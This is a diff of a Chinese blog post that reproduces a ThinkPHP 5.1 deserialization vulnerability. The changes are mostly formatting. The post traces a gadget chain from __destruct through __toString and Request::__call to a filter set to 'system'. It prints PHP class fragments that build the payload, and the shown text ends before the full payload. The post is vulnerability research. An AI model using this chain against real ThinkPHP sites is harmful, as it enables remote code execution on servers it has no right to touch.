@@ -34,7 +34,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/10/07/shduAywJ3p26c7o.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/07/l4pkceZn36aVyxh.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/09/iNn4vOAVBcK3Iam.png">
-<meta property="og:updated_time" content="2019-10-27T03:22:10.190Z">
+<meta property="og:updated_time" content="2019-12-01T02:11:19.345Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ThinkPHP5.1反序列化复现">
 <meta name="twitter:description" content="复现tp5.2.x反序列化之前先复现下tp5.1的反序列化漏洞">
@@ -221,60 +221,60 @@
 <p>常用反序列化入口</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__wakeup</span><br><span class="line">__destruct</span><br><span class="line">__toString</span><br></pre></td></tr></table></figure>
 
-<p>这里利用了__destruct()</p>
+<p>这里利用了<code>__destruct()</code></p>
 <p>直接搜索发现存在4处</p>
 <p><img src="https://i.loli.net/2019/10/06/ETxkzIYe9chFLwM.png" alt="Snipaste_2019-10-06_10-23-27.png"></p>
-<p>发现Windows.php中的removeFiles()存在file_exist()，会触发toString()</p>
+<p>发现<code>Windows.php</code>中的<code>removeFiles()</code>存在<code>file_exist()</code>，会触发<code>toString()</code></p>
 <p><img src="https://i.loli.net/2019/10/06/KUgYnhR4D9lasix.png" alt="Snipaste_2019-10-06_10-38-46.png"></p>
-<p>寻找一个实现toString()的方法</p>
+<p>寻找一个实现<code>toString()</code>的方法</p>
 <p><img src="https://i.loli.net/2019/10/06/GHirXPzKFtm4CTa.png" alt="Snipaste_2019-10-06_10-40-58.png"></p>
-<p>Conversion.php</p>
+<p><code>Conversion.php</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()</span><br><span class="line">&#123;</span><br><span class="line">	return $this-&gt;toJson();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function toJson($options = JSON_UNESCAPED_UNICODE)</span><br><span class="line">&#123;</span><br><span class="line">    return json_encode($this-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>$可控变量-&gt;方法(参数可控)<br>这样可以去触发某个类的__call方法,<br>找到符合条件的一处,其中 “$relation” 和 “$name” 都是可控变量,$name需要为数组</p>
+<p>追踪<code>toArray()</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$relation-&gt;visible($name);</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2019/10/06/VZwaOcDC2GHIm1u.png" alt="Snipaste_2019-10-06_11-01-28.png"></p>
-<p>那么只需要找一个类存在_call()而不存在visible()方法的类即可</p>
-<p>但是大多数类的_call()方法的$method我们不可控，为visible，也就意味着无法继续攻击，如下</p>
-<p>发现Request.php中我们可控</p>
+<p>那么只需要找一个类存在<code>__call()</code>而不存在<code>visible()</code>方法的类即可</p>
+<p>但是大多数类的<code>__call()</code>方法的<code>$method</code>我们不可控，为visible，也就意味着无法继续攻击，如下</p>
+<p>发现<code>Request.php</code>中我们可控</p>
 <p><img src="https://i.loli.net/2019/10/06/IKsv9RUeSZnl1c5.png" alt="Snipaste_2019-10-06_11-18-56.png"></p>
-<p>$method为visible，追踪$this-&gt;hook，发现是一个数组，我们可以自己定义</p>
+<p><code>$method为visible</code>，追踪<code>$this-&gt;hook</code>，发现是一个数组，我们可以自己定义</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$hook = [&quot;visable&quot;=&gt;&quot;method&quot;];</span><br></pre></td></tr></table></figure>
 
 <p>==========================================================================</p>
-<p>之后需要结合tp5.x的RCE漏洞，未完待续</p>
+<p>之后需要结合<code>tp5.x</code>的<code>RCE漏洞</code>，未完待续</p>
 <blockquote>
-<p>复现完ThinkPHP5.0.0-5.0.23的RCE，继续复现这里😶</p>
+<p>复现完<code>ThinkPHP5.0.0-5.0.23</code>的RCE，继续复现这里😶</p>
 </blockquote>
-<p>input()方法满足条件，之前的RCE也是利用这个方法</p>
+<p><code>input()</code>方法满足条件，之前的RCE也是利用这个方法</p>
 <blockquote>
 <p>但是这里不能直接调用，</p>
-<p>这里有个array_unshift($args, $this);</p>
-<p>会把$this放到$args数组的第一个元素。。。。</p>
-<p>所以我们传入的$data是一个对象xD，而要求传入数组，如果$data不是数组会终止程序</p>
+<p>这里有个<code>array_unshift($args, $this);</code></p>
+<p>会把<code>$this</code>放到<code>$args数组</code>的第一个元素。。。。</p>
+<p>所以我们传入的<code>$data</code>是一个对象xD，而要求传入数组，如果$data不是数组会终止程序</p>
 </blockquote>
 <p><img src="https://i.loli.net/2019/10/07/tom1CHARa8w4ZXn.png" alt="Snipaste_2019-10-07_12-01-17.png"></p>
-<p>既然input()无法直接调用，查看其他调用input()的方法。我复现的RCE()调用的是param()</p>
+<p>既然<code>input()</code>无法直接调用，查看其他调用<code>input()</code>的方法。我复现RCE调用的是<code>param()</code></p>
 <p><img src="https://i.loli.net/2019/10/07/EKjquDP197wh36X.png" alt="Snipaste_2019-10-07_12-06-39.png"></p>
-<p>跟踪$this-&gt;get()</p>
+<p>跟踪<code>$this-&gt;get()</code></p>
 <p><img src="https://i.loli.net/2019/10/07/4lNvCeiRgFWQ7Yu.png" alt="Snipaste_2019-10-07_12-08-48.png"></p>
 <blockquote>
 <p>发现不行，这样我们无法控制$name，传入的是对象字符串</p>
 <p>先复现下面的思路</p>
 </blockquote>
-<p>寻找调用param()函数的函数，找到了isAjax()</p>
+<p>寻找调用<code>param()</code>函数的函数，找到了<code>isAjax()</code></p>
 <p><img src="https://i.loli.net/2019/10/07/IDFe76hjRc1BYVb.png" alt="Snipaste_2019-10-07_13-18-15.png"></p>
-<p>我们可以控制param()的$name参数，即input()的$name参数，而input的$data数组：$this-&gt;param参数会和$_GET数组合并</p>
+<p>我们可以控制<code>param()</code>的<code>$name</code>参数，即<code>input()</code>的<code>$name</code>参数，而<code>input()</code>的<code>$data</code>数组由<code>$this-&gt;param</code>参数和<code>$_GET</code>数组合并</p>
 <p><img src="https://i.loli.net/2019/10/07/U6A7KqJNHCMSFo5.png" alt="Snipaste_2019-10-07_13-24-29.png"></p>
-<p>回到input()</p>
+<p>回到<code>input()</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = $this-&gt;getData($data, $name);</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2019/10/07/shduAywJ3p26c7o.png" alt="Snipaste_2019-10-07_13-31-15.png"></p>
-<p>$data=data[$val];</p>
+<p><code>$data=data[$val];</code></p>
 <p>之后就跟之前的RCE类似了，</p>
 <p><img src="https://i.loli.net/2019/10/07/l4pkceZn36aVyxh.png" alt="Snipaste_2019-10-07_22-08-17.png"></p>
-<p>$filter为我们传入的$filter，$data为$data[$val]</p>
+<p><code>$filter</code>为我们传入的<code>$filter</code>，<code>$data</code>为<code>$data[$val]</code></p>
 <h5 id="整理一下思路"><a href="#整理一下思路" class="headerlink" title="整理一下思路"></a>整理一下思路</h5><p>Windows类-&gt;__destruct()-&gt;removeFiles()-&gt;file_exists()-&gt;__toString()</p>
 <p>如果我们传入的$files为对象，该__toString()将会被调用</p>
 <p>Conversion类-&gt;__String()-&gt;toJson()-&gt;toArray()</p>
@@ -287,31 +287,31 @@
 <h5 id="构造payload思路"><a href="#构造payload思路" class="headerlink" title="构造payload思路"></a>构造payload思路</h5><p>从下面这一行入手</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$relation-&gt;visible($name);</span><br></pre></td></tr></table></figure>
 
-<p>$relation为$data数组中键对应的值，$name为$append数组中键对应的值</p>
+<p><code>$relation</code>为<code>$data数组</code>中键对应的值，<code>$name</code>为<code>$append数组</code>中键对应的值</p>
 <blockquote>
-<p>然后需要注意的是Conversion是Trait类型，需要寻找被use的地方，在Model类中</p>
+<p>然后需要注意的是<code>Conversion</code>是<code>Trait类型</code>，需要寻找被use的地方，在Model类中</p>
 </blockquote>
-<p>那么Model类中添加如下属性，存在__construct()方法</p>
+<p>那么<code>Model类</code>中添加如下属性，存在<code>__construct()</code>方法</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">namespace think;</span><br><span class="line">abstract class Model&#123;</span><br><span class="line">    protected $append = [];</span><br><span class="line">    private $data = [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;append = [&quot;ethan&quot;=&gt;[1]];</span><br><span class="line">        $this-&gt;data = [&quot;ethan&quot;=&gt;new Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>因为Model类是abstract修饰的，寻找继承它的子类，搜索到Pivot类</p>
 </blockquote>
 <p><img src="https://i.loli.net/2019/10/09/iNn4vOAVBcK3Iam.png" alt="Snipaste_2019-10-09_08-56-34.png"></p>
-<p>使用了父类的__construct()</p>
-<p>已经能调用其他类，然后是分析Request类，先分析__call()</p>
+<p>使用了父类的<code>__construct()</code></p>
+<p>已经能调用其他类，然后是分析<code>Request</code>类，先分析<code>__call()</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return call_user_func_array($this-&gt;hook[$method], $args);</span><br></pre></td></tr></table></figure>
 
-<p>这里需要注意，调用isAjax()需要加上类名，构造如下</p>
+<p>这里需要注意，调用<code>isAjax()</code>需要加上类名，构造如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];</span><br></pre></td></tr></table></figure>
 
 <p>继续分析最后一步</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);</span><br></pre></td></tr></table></figure>
 
-<p>$data来自$data数组，并且在param()中会和$_GET数组合并</p>
+<p><code>$data</code>来自<code>$data数组</code>，并且在<code>param()</code>中会和<code>$_GET数组</code>合并</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</span><br></pre></td></tr></table></figure>
 
-<p>$filter也可控</p>
+<p><code>$filter</code>也可控</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Request</span><br><span class="line">&#123;</span><br><span class="line">    protected $hook = [];</span><br><span class="line">    protected $filter = &quot;system&quot;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;filter = &quot;system&quot;;</span><br><span class="line">        $this-&gt;config = [&quot;var_ajax&quot;=&gt;&apos;&apos;];</span><br><span class="line">        $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>构造paylaod（参考链接）</p>
